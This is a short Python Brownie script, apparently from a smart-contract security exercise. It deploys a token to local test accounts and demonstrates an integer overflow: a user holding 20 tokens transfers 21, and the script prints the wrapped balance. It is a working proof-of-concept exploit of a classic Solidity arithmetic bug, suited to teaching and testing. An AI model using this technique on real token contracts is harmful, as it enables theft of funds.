import os
from brownie import *
from web3 import Web3

def deploy_token(owr):
    # deploy contract
    sc = Token.deploy(100, {'from':owr})
    return sc

def get_tokens(sc, owner, usr1):
    # owner sends 20 tokens to user 1
    sc.transfer(usr1, 20, {'from':owner})
    # check balance user 1
    balance_before = sc.balanceOf(usr1)
    # send all tokens to produce overflow
    tx_transfer = sc.transfer(owner, 21, {'from':usr1})
    print('\n[*] Balance user 1 before overflow, ', balance_before)
    print("[*] Balance user 1 after overflow, ", sc.balanceOf(usr1),'\n')

def main():
    # get owner
    owner = accounts[0]
    user1 = accounts[1]
    # deploy contract
    contract = deploy_token(owner)
    # get tokens
    get_tokens(contract, owner, user1)